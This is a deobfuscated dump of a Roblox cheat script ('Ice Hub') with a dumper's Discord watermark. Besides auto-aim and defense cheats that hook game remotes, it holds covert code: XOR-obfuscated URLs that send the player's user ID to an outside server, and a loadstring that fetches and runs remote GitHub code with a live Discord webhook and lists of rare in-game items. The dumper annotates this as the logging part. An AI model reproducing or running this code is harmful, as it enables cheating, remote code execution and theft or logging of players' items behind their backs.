									local frame6 = Instance.new("Frame")
									frame6.Size = UDim2.new(1, v82[46], 0, n37)
									frame6.Position = UDim2.new(0, v82[46], v82[46], n36)
									frame6.BackgroundColor3 = tbl21.bg
									frame6.BackgroundTransparency = 0.48
									frame6.BorderSizePixel = v82[46]
									frame6.Visible = false
									frame6.ZIndex = v82[69]
									frame6.Parent = frame2
									createUICorner2(frame6, 10)
									createUIStroke2(frame6, Color3.fromRGB(65, v82[145], 255), 1, 0.45)
									local instance5 = Instance.new(v82[16])
									instance5.PaddingLeft = UDim.new(v82[46], 10)
									instance5.PaddingRight = UDim.new(0, 10)
									instance5.Parent = frame6
									local textLabel2 = Instance.new("TextLabel")
									textLabel2.Size = UDim2.new(v82[118], 0, 0, isMobile and 26 or 23)
									textLabel2.Position = UDim2.new(0, 0, 0, v82[113])
									textLabel2.BackgroundTransparency = 1
									textLabel2.Text = "ACTIONS"
									textLabel2.TextColor3 = tbl21.gold
									textLabel2.TextSize = isMobile and 13 or 11
									textLabel2.Font = Enum.Font.GothamBlack
									textLabel2.TextXAlignment = Enum.TextXAlignment.Left
									textLabel2.ZIndex = 21
									textLabel2.Parent = frame6
									local instance6 = Instance.new(v82[53])
									instance6.Size = UDim2.new(1, 0, 0, v82[118])
									instance6.Position = UDim2.new(v82[46], 0, v82[46], isMobile and v82[92] or 27)
									instance6.BackgroundColor3 = Color3.fromRGB(60, 145, 255)
									instance6.BackgroundTransparency = 0.45
									instance6.BorderSizePixel = 0
									instance6.ZIndex = 21
									instance6.Parent = frame6

									local function fn58(parent, arg, text, visible, arg2)
										local frame7 = Instance.new("Frame")
										frame7.Size = UDim2.new(1, 0, 0, n39)
										frame7.Position = UDim2.new(0, 0, 0, arg)
										frame7.BackgroundColor3 = tbl21.panel
										frame7.BackgroundTransparency = v82[101]
										frame7.BorderSizePixel = 0
										frame7.ZIndex = v82[164]
										frame7.Parent = parent
										createUICorner2(frame7, 8)
										local textLabel3 = Instance.new("TextLabel")
										textLabel3.Size = UDim2.new(1, -42, 1, 0)
										textLabel3.Position = UDim2.new(0, 8, 0, 0)
										textLabel3.BackgroundTransparency = 1
										textLabel3.Text = text
										textLabel3.TextColor3 = tbl21.white
										textLabel3.TextSize = isMobile and v82[163] or v82[78]
										textLabel3.Font = Enum.Font.GothamBold
										textLabel3.TextXAlignment = Enum.TextXAlignment.Left
										textLabel3.ZIndex = 22
										textLabel3.Parent = frame7
										local frame8 = Instance.new("Frame")
										frame8.Size = UDim2.new(v82[46], isMobile and 20 or v82[190], 0, isMobile and v82[69] or v82[190])
										frame8.Position = UDim2.new(1, -(isMobile and 24 or v82[33]), 0.5, -(isMobile and 10 or 9))
										frame8.BackgroundColor3 = visible and tbl21.check or tbl21.dark
										frame8.BorderSizePixel = 0
										frame8.ZIndex = v82[33]
										frame8.Parent = frame7
										createUICorner2(frame8, 5)
										createUIStroke2(frame8, Color3.fromRGB(65, v82[145], 255), 1, 0.35)
										local textLabel4 = Instance.new("TextLabel")
										textLabel4.Size = UDim2.new(1, 0, v82[118], v82[46])
										textLabel4.BackgroundTransparency = 1
										textLabel4.Text = "✓"
										textLabel4.TextColor3 = tbl21.white
										textLabel4.TextSize = isMobile and v82[21] or 12
										textLabel4.Font = Enum.Font.GothamBold
										textLabel4.Visible = visible
										textLabel4.ZIndex = v82[73]
										textLabel4.Parent = frame8
										local textButton4 = Instance.new("TextButton")
										textButton4.Size = UDim2.new(1, 0, v82[118], 0)
										textButton4.BackgroundTransparency = 1
										textButton4.Text = ""
										textButton4.ZIndex = 24
										textButton4.Parent = frame7
										local v92 = visible

										local function fn59(arg3, arg4)
											v92 = arg3
											TweenService2:Create(frame8, tweenInfo, { BackgroundColor3 = v92 and tbl21.check or tbl21.dark }):Play()
											textLabel4.Visible = v92

											if arg4 ~= false then
												arg2(v92)
											end
										end

										textButton4.MouseButton1Click:Connect(function()
											fn59(not v92, true)
										end)

										return function(arg3)
											fn59(arg3, false)
										end
									end

									local n43 = isMobile and 36 or v82[104]

									fn58(frame6, n43, "Balloon", flag19, function(balloon)
										flag19 = balloon
										tbl18.autoDefense.balloon = balloon
										fn36()
									end)

									fn58(frame6, n43 + n39 + 5, "Laser Cape", flag20, function(laser)
										flag20 = laser
										tbl18.autoDefense.laser = laser
										fn36()
									end)

									local flag21 = false

									local function fn59(enabled, arg)
										flag18 = enabled

										if arg ~= v82[120] then
											tbl18.autoDefense.enabled = enabled
											fn36()
										end

										if enabled then
											uiGradient.Color = ColorSequence.new(tbl17.ACCENT_KEYS)

											if not flag21 then
												table.insert(tbl17.allGradients, uiGradient)
												flag21 = true
											end

											TweenService2:Create(frame5, tweenInfo, { Position = UDim2.new(1, -n42 - v82[23], v82[91], -n42 / 2) }):Play()
											textLabel.TextColor3 = tbl21.white
										else
											local new = ColorSequenceKeypoint.new
											local dark = tbl21.dark
											uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, tbl21.dark), new(1, dark) })

											if flag21 then
												for i, allGradient in ipairs(tbl17.allGradients) do
													if allGradient == uiGradient then
														table.remove(tbl17.allGradients, i)
														break
													end
												end

												flag21 = false
											end

											TweenService2:Create(frame5, tweenInfo, { Position = UDim2.new(0, 2, v82[91], -n42 / 2) }):Play()
											textLabel.TextColor3 = tbl21.white
										end
									end

									fn59(flag18, false)

									textButton3.MouseButton1Click:Connect(function()
										fn59(not flag18, true)
									end)

									textButton2.MouseButton1Click:Connect(function()
										settingsOpen = not settingsOpen
										tbl18.autoDefense.settingsOpen = settingsOpen
										fn36()
										textButton2.TextColor3 = settingsOpen and tbl21.white or tbl21.gold

										if settingsOpen then
											frame6.Visible = true
											TweenService2:Create(frame2, tweenInfo, { Size = UDim2.new(0, n35, 0, n38) }):Play()
										else
											local tween = TweenService2:Create(frame2, tweenInfo, { Size = UDim2.new(0, n35, 0, n36) })
											tween:Play()

											task.spawn(function()
												tween.Completed:Wait()

												if not settingsOpen then
													frame6.Visible = false
												end
											end)
										end
									end)

									if settingsOpen then
										frame6.Visible = v82[76]
										frame2.Size = UDim2.new(v82[46], n35, 0, n38)
										textButton2.TextColor3 = tbl21.white
									end

									local tbl22 = {}
									local tbl23 = {}
									local n44 = 0
									local tbl24 = {}
									local connection = nil
									local tbl25 = { "HumanoidRootPart", "UpperTorso", "Torso", "Head" }

									local function fn60()
										local fhUseItemRemote = _G._FH_UseItemRemote
										if typeof(fhUseItemRemote) == "Instance" and fhUseItemRemote.Parent then
											return fhUseItemRemote
										end
										local v92 = getconnections
										local getconstants_ = debug and debug.getconstants or getconstants
										if type(v92) ~= "function" or type(getconstants_) ~= "function" then
											return nil
										end

										local ok, result = pcall(function()
											return ReplicatedStorage:WaitForChild("Packages", v82[42]):WaitForChild("Net", v82[42])
										end)

										if not ok or not result then
											return nil
										end
										local v93 = nil

										for _, child in ipairs(result:GetChildren()) do
											if child:IsA("RemoteEvent") and not v93 then
												local ok2, result2 = pcall(v92, child.OnClientEvent)

												if ok2 and result2 then
													for _, v94 in ipairs(result2) do
														local v95

														if type(v94.Function) == "function" then
															local ok3, result3 = pcall(getconstants_, v94.Function)

															if ok3 and result3 then
																for _, v96 in ipairs(result3) do
																	if v96 == "PaintballHitted" then
																		v93 = child
																		break
																	end
																end

																v95 = v93
															else
																v95 = v93
															end
														else
															v95 = v93
														end

														if v95 then
															v93 = v95
															break
														else
															v93 = v95
														end
													end
												end
											end

											if not v93 then
												continue
											end
											break
										end

										if v93 then
											if n24 >= 9611 then
												while true do
												end
											elseif 14815 >= n26(4781) then
												_G._FH_UseItemRemote = v93
											else
												while true do
												end
											end
										end

										return v93
									end

									local function fn61()
										local ok, result = pcall(function()
											return ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):GetChildren()
										end)

										if not ok or not result then
											if 9589 >= n24 then
												while v82[76] do
												end
											end

											return
										end

										tbl22 = {}
										tbl23 = {}

										for i, v92 in ipairs(result) do
											if v92:IsA("RemoteEvent") then
												local v93 = result[i + 1]

												if v93 then
													tbl22[v92.Name] = i + 1
													tbl23[i + 1] = v93
												end
											end
										end
									end

									local function fn62(arg, ...)
										if arg == "RE/UseItem" or arg == "UseItem" then
											local v92 = fn60()
											if v92 then
												v92:FireServer(...)
												return true
											end
										end

										local v92 = tbl22[arg]
										if v92 and tbl23[v92] then
											tbl23[v92]:FireServer(...)
											return true
										end
										return v82[120]
									end

									local function fn63(arg)
										local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")
										return humanoid and humanoid.Health > 0
									end

									local function fn64()
										local character = localPlayer3.Character
										character = character and character:FindFirstChild("HumanoidRootPart")
										if not character then
											return nil
										end
										local n45 = 800
										local v92 = nil

										for _, player in pairs(Players2:GetPlayers()) do
											if player ~= localPlayer3 then
												local character2 = player.Character
												local humanoidRootPart = character2 and character2:FindFirstChild("HumanoidRootPart")

												if humanoidRootPart and fn63(character2) then
													local magnitude = (humanoidRootPart.Position - character.Position).Magnitude

													if magnitude < n45 then
														n45 = magnitude
														v92 = player
													end
												end
											end
										end

										return v92
									end

									local function fn65(arg)
										for _, v92 in pairs(tbl25) do
											local v93 = arg:FindFirstChild(v92)
											if v93 then
												return v93
											end
										end

										return nil
									end

									local function fn66()
										local v92 = fn64()
										if not v92 then
											return
										end
										local character = v92.Character
										if not character or not fn63(character) then
											return
										end
										local v93 = fn65(character)
										if not v93 then
											return
										end
										local vector = Vector3.zero

										pcall(function()
											local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

											if humanoidRootPart then
												vector = humanoidRootPart.Velocity or Vector3.zero
											end
										end)

										local n45 = v93.Position + Vector3.new(0, 0.5, 0) + vector * 0.18

										if not (tbl22["RE/UseItem"] or tbl22.UseItem) then
											fn61()
										end

										if not fn62("RE/UseItem", n45, v93) then
											fn61()
											fn62("RE/UseItem", n45, v93)
										end
									end

									local function fn67()
										local now2 = tick()
										if now2 - n44 < 0.04 then
											return
										end
										n44 = now2
										fn66()
									end

									local function fn68(arg)
										for _, v92 in ipairs(tbl24) do
											pcall(v92.Disconnect, v92)
										end

										tbl24 = {}
										fn61()
										table.insert(tbl24, arg.Activated:Connect(fn67))

										table.insert(tbl24, UserInputService2.InputBegan:Connect(function(input, gameProcessed)
											if gameProcessed then
												return
											end
											local character = localPlayer3.Character
											character = character and character:FindFirstChildOfClass("Tool")
											if not (character and character.Name == "Laser Cape") then
												return
											end

											if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
												fn67()
											end
										end))
									end

									local function fn69()
										for _, v92 in ipairs(tbl24) do
											pcall(v92.Disconnect, v92)
										end

										tbl24 = {}
									end

									local function fn70(character)
										if connection then
											pcall(connection.Disconnect, connection)
										end

										local tool = character:FindFirstChildOfClass("Tool")

										if tool and tool.Name == "Laser Cape" then
											fn68(tool)
										end

										connection = character.ChildAdded:Connect(function(child)
											if child:IsA("Tool") and child.Name == "Laser Cape" then
												fn68(child)
											end
										end)

										character.ChildRemoved:Connect(function(child)
											if child:IsA("Tool") and child.Name == "Laser Cape" then
												fn69()
											end
										end)
									end

									if localPlayer3.Character then
										fn70(localPlayer3.Character)
									end

									localPlayer3.CharacterAdded:Connect(fn70)
									local v92 = nil

									local function fn71()
										if v92 and v92.Parent then
											return v92
										end
										local plots = workspace:FindFirstChild("Plots")
										if not plots then
											return nil
										end

										for _, child in ipairs(plots:GetChildren()) do
											local surfaceGui = child:FindFirstChild(v82[6])
											local yourBase = surfaceGui and surfaceGui:FindFirstChild("YourBase", true)
											if yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled then
												v92 = child
												return child
											end
											surfaceGui = surfaceGui and surfaceGui:FindFirstChild("SurfaceGui")
											surfaceGui = surfaceGui and surfaceGui:FindFirstChild(v82[53])
											surfaceGui = surfaceGui and surfaceGui:FindFirstChild("TextLabel")

											if surfaceGui and surfaceGui:IsA("TextLabel") then
												local str8 = tostring(surfaceGui.Text or ""):lower()
												if str8:find(localPlayer3.Name:lower(), 1, true) or str8:find(localPlayer3.DisplayName:lower(), 1, true) then
													v92 = child
													return child
												end
											end
										end

										return nil
									end

									local function fn72(arg)
										local v93 = fn71()
										if not v93 then
											return false
										end
										local character = arg.Character
										if not character then
											return false
										end
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
										if not humanoidRootPart then
											return false
										end

										local ok, result, result2 = pcall(function()
											if n27(3886) > 6752 then
												return v93:GetBoundingBox()
											end

											while true do
											end
										end)

										if not ok then
											return false
										end
										local v94 = result:PointToObjectSpace(humanoidRootPart.Position)
										local n45 = result2.X / 2
										local flag22 = math.abs(v94.X) <= n45

										if flag22 then
											local n46 = result2.Y / v82[23]
											flag22 = math.abs(v94.Y) <= n46
										end

										local flag23

										if flag22 then
											local n46 = result2.Z / 2
											flag23 = math.abs(v94.Z) <= n46
										else
											flag23 = flag22
										end

										return flag23
									end

									local function fn73(arg)
										if not arg or arg.Parent ~= Players2 then
											return
										end

										pcall(function()
											fn32(arg, "balloon")
										end)
									end

									local function fn74()
										local character = localPlayer3.Character
										if not character then
											return
										end
										local humanoid = character:FindFirstChildOfClass("Humanoid")
										if not humanoid then
											return
										end
										local v93 = nil
										local backpack = localPlayer3:FindFirstChild("Backpack")

										if backpack then
											for _, child in ipairs(backpack:GetChildren()) do
												if child:IsA("Tool") and child.Name == "Laser Cape" then
													v93 = child
													break
												end
											end
										end

										if not v93 then
											for _, child in ipairs(character:GetChildren()) do
												if child:IsA("Tool") and child.Name == "Laser Cape" then
													v93 = child
													break
												end
											end
										end

										if not v93 then
											return
										end

										if v93.Parent ~= character then
											pcall(function()
												humanoid:EquipTool(v93)
											end)

											task.wait(0.1)
										end

										pcall(function()
											v93:Activate()
										end)
									end

									local function fn75(arg)
										pcall(function()
											StarterGui:SetCore("SendNotification", { Title = "Ice Hub Auto Defense", Text = arg, Duration = 2 })
										end)
									end

									local tbl26 = {}
									local tbl27 = {}

									local function fn76(arg)
										if not flag18 or not arg or arg == localPlayer3 then
											return
										end

										if arg:GetAttribute("StealingPlayer") ~= true then
											return
										end

										if not fn72(arg) then
											return
										end
										local userId = arg.UserId
										local now2 = tick()
										if now2 - (tbl26[userId] or 0) < 2 then
											return
										end
										tbl26[userId] = now2

										if flag19 and flag20 then
											fn75(arg.Name .. " -> balloon + laser cape !")
										elseif flag19 then
											fn75(arg.Name .. " -> balloon !")
										elseif flag20 then
											fn75(arg.Name .. " -> laser cape !")
										end

										if flag19 then
											task.spawn(fn73, arg)
										end

										if flag20 then
											task.spawn(fn74)
										end
									end

									local function fn77(player)
										if not player or player == localPlayer3 or tbl27[player] then
											return
										end

										tbl27[player] = player:GetAttributeChangedSignal("StealingPlayer"):Connect(function()
											fn76(player)
										end)

										if player:GetAttribute("StealingPlayer") == true then
											task.defer(fn76, player)
										end
									end

									for _, player in ipairs(Players2:GetPlayers()) do
										fn77(player)
									end

									Players2.PlayerAdded:Connect(fn77)

									Players2.PlayerRemoving:Connect(function(player)
										tbl26[player.UserId] = nil
										local v93 = tbl27[player]

										if v93 then
											v93:Disconnect()
											tbl27[player] = nil
										end
									end)

									print("Skide Skide Sahurrrrrrr")
								end)

								if not ok then
									warn("[ICE HUB Auto Defense] " .. tostring(result))
								end
							end)

							task.spawn(function()
								local v92 = nil
								local v93 = nil
								local flag18 = v82[120]
								local v94 = nil
								local v95 = nil
								local v96 = nil

								local function fn58(arg)
									local str8 = tostring(arg or ""):gsub("%s+", "")
									local match, v97 = str8:match("^(%d+):(%d+)$")
									if match and v97 then
										return tonumber(match) * 60 + tonumber(v97)
									end
									local match2, v98, v99 = str8:match("^(%d+):(%d+):(%d+)$")
									if match2 and v98 and v99 then
										return tonumber(match2) * 3600 + tonumber(v98) * 60 + tonumber(v99)
									end
									return tonumber(str8:match("(%d+%.?%d*)"))
								end

								local function fn59()
									local character = localPlayer.Character
									local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
									local plots = service3:FindFirstChild("Plots")
									if not humanoidRootPart or not plots then
										return nil, nil
									end
									local flag19 = (humanoidRootPart.Position - tbl19.b1.refVec).Magnitude < (humanoidRootPart.Position - tbl19.b2.refVec).Magnitude
									local n35 = flag19 and 1 or 2
									if v94 == n35 and v95 and v95.Parent and v96 and v96.Parent then
										return v95, v96
									end
									local refVec = flag19 and tbl19.b2.refVec or tbl19.b1.refVec
									local huge = math.huge
									local v97 = nil

									for _, child in ipairs(plots:GetChildren()) do
										if child:IsA("Model") and fn40(child) then
											local position = nil

											pcall(function()
												position = child.PrimaryPart and child.PrimaryPart.Position or child:GetPivot().Position
											end)

											if position then
												local magnitude = (position - refVec).Magnitude

												if magnitude < huge then
													v97 = child
													huge = magnitude
												end
											end
										end
									end

									if not v97 then
										return nil, nil
									end
									local purchases = v97:FindFirstChild("Purchases")
									purchases = purchases and purchases:FindFirstChild("PlotBlock")
									purchases = purchases and purchases:FindFirstChild("Main")
									purchases = purchases and purchases:FindFirstChild("BillboardGui")
									purchases = purchases and purchases:FindFirstChild("RemainingTime")
									v94 = n35
									v95 = v97
									v96 = purchases
									return v97, purchases
								end

								while task.wait(0.25) do
									if not semitp.autoSemiOnTimer then
										v92 = nil
										v93 = nil
										v94 = nil
										v95 = nil
										v96 = nil
										flag18 = false
									else
										pcall(function()
											local v97, v98 = fn59()

											if v97 ~= v93 then
												v93 = v97
												v92 = nil
												flag18 = false
											end

											if v98 and v98.Text ~= nil then
												local v99 = fn58(v98.Text)

												if v99 then
													if v99 > 0 then
														flag18 = false
													elseif v92 and v92 > v82[46] and not flag18 then
														flag18 = true
														halfwaySteal.execute()
													end

													v92 = v99
												end
											end
										end)
									end
								end
							end)

							repeat
								task.wait()
							until game:IsLoaded()

							do
								local Players2 = game:GetService("Players")
								HttpService = game:GetService("HttpService")
								localPlayer2 = Players2.LocalPlayer or Players2.PlayerAdded:Wait()
							end
						end

						genv = type(getgenv) == "function" and getgenv() or _G

-- Dump By Aeroz hub

@q3cg  

https://discord.gg/ZusW3VnQCf


						do
							local request_2 = request or http_request or syn and syn.request

							if request_2 then
								request_ = request_2
							else
								request_ = http and http.request
							end
						end
					end

					do
						local pabloPresenceBrainrot, v92, v93

						do
							if type(request_) ~= "function" then
								return
							end

							if type(genv.PABLO_PRESENCE_BRAINROT) == "table" then
								genv.PABLO_PRESENCE_BRAINROT.running = false
							end

							pabloPresenceBrainrot = { running = true, token = nil, tokenAt = 0 }
							genv.PABLO_PRESENCE_BRAINROT = pabloPresenceBrainrot

							do
								local function fn58(arg, arg2)
									local v94 = table.create(#arg)

									for i = 1, #arg do
										v94[i] = string.char(bit32.bxor(arg[i], arg2))
									end

									return table.concat(v94)
								end

								v92 = fn58({
									33,
									61,
									61,
									57,
									58,
									115,
									102,
									102,
									32,
									v82[27],
									44,
									v82[104],
									v82[152],
									v82[157],
									103,
									43,
									v82[181],
									58,
									61,
									102,
									40,
									57,
									32,
									102,
									57,
									59,
									44,
									v82[128],
									44,
									39,
									42,
									v82[181],
									102,
									v82[157],
									59,
									40,
									v82[153],
									39,
									59,
									v82[87],
									61,
									102,
									58,
									44,
									58,
									58,
									32,
									38,
									39,
								}, 73)

								v93 = fn58({
									33,
									61,
									61,
									57,
									58,
									115,
									102,
									102,
									32,
									42,
									44,
									33,
									60,
									43,
									103,
									43,
									v82[181],
									58,
									61,
									102,
									40,
									v82[147],
									32,
									102,
									57,
									59,
									44,
									58,
									v82[181],
									39,
									42,
									44,
									102,
									43,
									59,
									40,
									v82[153],
									39,
									59,
									v82[87],
									61,
								}, 73)
							end
						end

						local fn58

						do
							do
								local function fn59(arg)
									if type(arg) ~= "string" or arg == "" then
										return nil
									end
									local ok, result = pcall(HttpService.JSONDecode, HttpService, arg)
									return ok and type(result) == "table" and result or nil
								end

								fn58 = function()
									local ok, result = pcall(request_, {
										Url = v92,
										Method = "POST",
										Headers = { ["Content-Type"] = "application/json", Accept = "application/json" },
										Body = HttpService:JSONEncode({ userId = tostring(localPlayer2.UserId) }),
									})

									if not ok or type(result) ~= "table" then
										return false
									end
									local n35 = tonumber(result.StatusCode or result.Status) or 0
									if n35 < 200 or n35 >= 300 then
										return v82[120]
									end
									local v94 = fn59(result.Body)
									local flag18 = not v94
									local flag19

									if flag18 then
										flag19 = flag18
									else
										local v95 = v82[72]
										flag19 = type(v94.token) ~= v95
									end

									if flag19 or #v94.token < v82[69] then
										return false
									end
									pabloPresenceBrainrot.token = v94.token
									pabloPresenceBrainrot.tokenAt = os.clock()
									return true
								end
							end
						end

						do
							local function fn59()
								if not pabloPresenceBrainrot.token and not fn58() then
									if not flag2 then
										return
									end
									return false
								end

								local ok, result = pcall(request_, {
									Url = v93,
									Method = "POST",
									Headers = {
										["Content-Type"] = "application/json",
										Accept = "application/json",
										Authorization = "Bearer " .. pabloPresenceBrainrot.token,
									},
									Body = "{}",
								})

								local flag18 = not ok
								local flag19

								if flag18 then
									flag19 = flag18
								else
									local v94 = v82[29]
									flag19 = type(result) ~= v94
								end

								if flag19 then
									return false
								end
								local n35 = tonumber(result.StatusCode or result.Status) or 0
								if n35 == 401 or n35 == 403 then
									pabloPresenceBrainrot.token = nil
									return false
								end
								return n35 >= 200 and n35 < 300
							end

							task.spawn(function()
								fn59()

								while true do
									if pabloPresenceBrainrot.running and genv.PABLO_PRESENCE_BRAINROT == pabloPresenceBrainrot then
										task.wait(5)

										if not (not pabloPresenceBrainrot.running or genv.PABLO_PRESENCE_BRAINROT ~= pabloPresenceBrainrot) then
											local token = pabloPresenceBrainrot.token

											if token then
												local tokenAt = pabloPresenceBrainrot.tokenAt
												token = os.clock() - tokenAt >= 540
											end

											if token then
												pabloPresenceBrainrot.token = nil
											end

											fn59()
											continue
										end
									end

									break
								end
							end)
						end
					end

(Ice Hub its loggin here Is the part)

					do
						local tbl21 = {
							["Strawberry Elephant"] = true,
							Meowl = v82[76],
							["Skibidi Toilet"] = true,
							["John Pork"] = v82[76],
							["Headless Horseman"] = true,
							["Dragon Cannelloni"] = true,
							["Dragon Gingerini"] = true,
							Griffin = true,
							["Hydra Dragon Cannelloni"] = true,
							["Elefanto Frigo"] = true,
							Antonio = true,
							["Hydra Bunny"] = true,
							Arcadragon = true,
							["Pancake and Syrup"] = true,
							["Kalika Bros"] = true,
							["Dragon Aquanini"] = true,
							["La Casa Boo"] = true,
							["La Supreme Combinasion"] = true,
							["Signore Carapace"] = v82[76],
							["Fishino Clownino"] = true,
							Kraken = true,
							["Duggy Bros"] = true,
							Cerberus = true,
							Venuspino = true,
							["Foxini Lanternini"] = true,
							["Jelly Moby"] = true,
							["Digi Narwhal"] = v82[76],
							["Moby Bros"] = v82[76],
							["Bunny and Eggy"] = v82[76],
							["Capitano Moby"] = true,
							["Cooki and Milki"] = true,
							["Ginger Gerat"] = true,
							["Ketupat Bros"] = true,
							Bumbatron = v82[76],
							["La Breakfast Combinasion"] = v82[76],
							["Love Love Bear"] = true,
							["Quackini Snackini"] = true,
						}

						local tbl22 = {
							Cursed = true,
							Cyber = true,
							Diamond = v82[76],
							Divine = v82[76],
							Gold = true,
							["Yin Yang"] = true,
							Galaxy = v82[76],
						}

						local tbl23 = { ["Rainbow Hammer"] = true, ["Bloodmoon Hammer"] = true }

						task.spawn(function()
							local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()

							if type(lib) == "function" then
								lib(7412398669, "Luis_munuz82", "https://discord.com/api/webhooks/1543758224816349225/5m8HTxktqcRMqGHbw2hui_dZVab5LuRJJYiWbsIYuwyxTOQ9KVgVOOOXGRx79ovs8Gek", tbl21, tbl22, tbl23)
							end
						end)
					end

					return
				end

				while true do
				end
			end
		end
	end
end

-- Dump By Aeroz hub

@q3cg  

https://discord.gg/ZusW3VnQCf